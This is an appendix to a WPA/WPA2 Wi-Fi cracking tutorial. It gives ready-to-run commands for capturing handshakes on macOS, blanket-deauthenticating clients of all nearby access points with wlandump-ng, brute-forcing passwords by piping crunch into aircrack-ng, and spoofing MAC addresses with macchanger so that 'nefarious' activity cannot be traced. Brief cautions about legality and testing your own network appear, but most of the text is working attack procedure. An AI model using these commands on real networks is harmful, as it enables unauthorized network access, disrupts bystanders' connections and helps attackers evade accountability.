# Appendix

After the initial release of this tutorial, several people from various corners of the internet reached out with comments and suggestions. In an effort to keep the original tutorial short and sweet, I've included information about their wonderful suggestions here, and added some of my own. Here you will find info on:

- Wi-Fi cracking on MacOS/OSX
- Capturing handshakes with `wlandump-ng`
- Generating wordlists with `crunch`
- Protecting your identity with `macchanger`

## Wi-Fi cracking on MacOS/OSX

Huge thanks to [@harshpatel991](https://github.com/harshpatel991) for contributing this guide. The following explains how to use built-in MacOS/OSX tools to capture a 4-way handshake and naive-hashcat to determine the password of a WPA/WPA2 wireless network. This method has been tested on OSX versions 10.10 and 10.12 but will likely work with other versions as well. Like the main tutorial, it assumes you have a [wireless card](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html) that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode). We've tested this on both Early-2012 and Mid-2015 Macbook Pros with great success.

### Wireless Diagnostics tools

Luckily, OSX comes with a suite of wireless diagnostic tools. To open them, hold down the option key on your keyboard and click on the Wi-Fi icon in the menu bar. Then click "Open Wireless Diagnostics..."

### Determine the channel of your target network

With Wireless Diagnostics open, click on Window > Scan. Find the target network, note its channel and width.

### Capture a 4-way Handshake

1. With Wireless Diagnostics open, click on Window > Sniffer. Select the channel and width that you found in the previous step.
2. Now you'll need to wait for a device to connect to the target network. If you are testing this on your network (which you should be), reconnect a wireless device to capture a handshake.
3. Once you think you've got a handshake, click Stop.
4. The `.wcap` capture file will either be saved to your Desktop or `/var/tmp/` depending on your operating system version.
5. Convert the capture file to `.hccapx` by uploading it to https://hashcat.net/cap2hccapx/. If you captured any handshakes, the site will start downloading a `.hccapx` file. No download will be prompted if you did not.

### Crack the password with `naive-hashcat`

```bash
# clone naive-hashcat
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# build from source on MacOS/OSX
./build-hashcat-osx.sh

# download the 134MB rockyou dictionary file
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

Finally, run `naive-hashcat.sh`. Change `handshake.hccapx` to the name of the file you downloaded from [hashcat.net](https://hashcat.net/cap2hccapx/). `cracked.pot` is the name of the output file. 

```
HASH_FILE=handshake.hccapx POT_FILE=cracked.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

Thanks again to [@harshpatel991](https://github.com/harshpatel991), as well as [phillips321](http://www.phillips321.co.uk/) for his [post](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/) about building hashcat for OSX.

## Capturing handshakes with `wlandump-ng`

[@enilfodne](https://github.com/enilfodne) has [informed me](https://github.com/brannondorsey/wifi-cracking/issues/15) that the hashcat community has a prefered tool for capturing WPA 4-way handshakes, called `wlandump-ng`. This tool belongs to a suite of hashcat related utilities called [hcxtools](https://github.com/ZerBea/hcxtools) developed by [ZerBea](https://github.com/ZerBea), and has notable perks over `airdump-ng`. `wlandump-ng` allows you to blanket capture handshakes from every nearby network at once, hopping Wi-Fi channels in order to increase collection.


```bash
# clone hcxtools
git clone https://github.com/ZerBea/hcxtools
cd hcxtools

# build and install
# you will likely need to apt install the required dependencies:
# https://github.com/ZerBea/hcxtools#requirements
make
sudo make install

# blanket death connected clients from all nearby access points and listen for re-connections
# replace wlan0 with your wireless device name
wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 

# once you've got a capture file, you can convert it to the hashcat capture format with
cap2hccapx.bin capture.cap capture.hccapx
```

`wlandump-ng` command-line args (use `-h` flag for full list):

- `-c 1`: start in the 2.4Ghz range from channel 1 (will go to 13)
- `-t 60`: stay on each channel for 60s (experiment with lower values, default is `5`)
- `-d 100`: send deauth every 100 beacon frames
- `-D 10`: send disassosciation packets every 10 beacons frames
- `-m 512`: internal ringbuffer size, use 512 for low resource machines
- `-b`: activate beaconing to last 10 probe requests
- `-r`: reset deauthentication/disassosciation counter if hop loop is on channel 1
- `-s 20`: display 20 status lines

**WARNING:** Using this is likely illegal in most places. See [here](https://github.com/ZerBea/hcxtools#warning) for more info.

`wlandump-ng` also offers the option to run in passive mode without transmitting any deauth/disassociation frames. This is recommended if you are are sensitive to disrupting the network activity of those around you (which you should be). The trade-off is that you will capture far fewer handshakes, but this method makes the capture undetectable.

```bash
# run with default settings in passive mode
wlandump-ng -i wlan0 -o capture.cap -p -s 20 
```

## Generating wordlists with `crunch`

`crunch`is a tool to generate wordlists using combinations of a given string or pattern. We can use crunch to generate a password list on-the-fly and pipe it to `aircrack-ng` without having the wordlist saved to disk.

```bash
# install crunch
sudo apt-get install crunch
```

To get an idea of how crunch works, run it from the command-line (be ready to press `ctrl-c` once it starts spewing passwords):

```bash
# syntax 8 8 are min-length and max-length of password to generate
# 01234567890 is the set of characters to combine/permute to construct the passwords
crunch 8 8 0123456789
```

```
Crunch will now generate the following amount of data: 900000000 bytes
858 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100000000 
00000000
00000001
00000002
00000003
00000004
00000005
00000006
00000007
00000008
00000009
...
99999999
```

We can pipe the output of `crunch` as the input to `aircrack-ng`, using the passwords that it generates as our wordlist. Here we use the `crunch` special rule character `%` to denote a digit. This command attempts to crack WPA passwords that are 10-digit phone numbers (using 102GB of numbers generated by crunch on-the-fly): 

```bash
# we can also use -t "@^%," to use pattern '@' - replaced with lowercase ',' - replaced with uppercase
# '%' - replaced with numbers and '^' - is replaced with special chars
# *************** don't forget '-' at the end
crunch 10 10 -t "%%%%%%%%%%" | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -
```

Thanks to [@hiteshnayak305](https://github.com/hiteshnayak305) for the introduction to `crunch` and including this update as a [PR](https://github.com/brannondorsey/wifi-cracking/pull/17).

## Protecting your identify with `macchanger`

Whenever you are doing anything remotely nefarious with Wi-Fi, it is a good idea to spoof your MAC address of your Wi-Fi device so that any network traffic that gets recorded can't be tied to serial assigned by your device manufacturer.

This is trivial with `macchanger`:

```bash
# download MAC changer
sudo apt-get install macchanger

# bring the device down
sudo ifconfig wlan0 down

# change the mac
# -A pics a random MAC w/ a valid vendor
# -r makes it truly random
# -p restores it to the original hardware MAC
sudo macchanger -A wlan0

# bring the device back up
sudo ifconfig wlan0 up
```

If you've got multiple cards, it might also be a good idea to do this to all of them. Or better yet, bring unused wireless interfaces down whenever you are attempting to capture handshakes, to leave as little trace as possible. Note that spoofing changes do not persist across reboots.
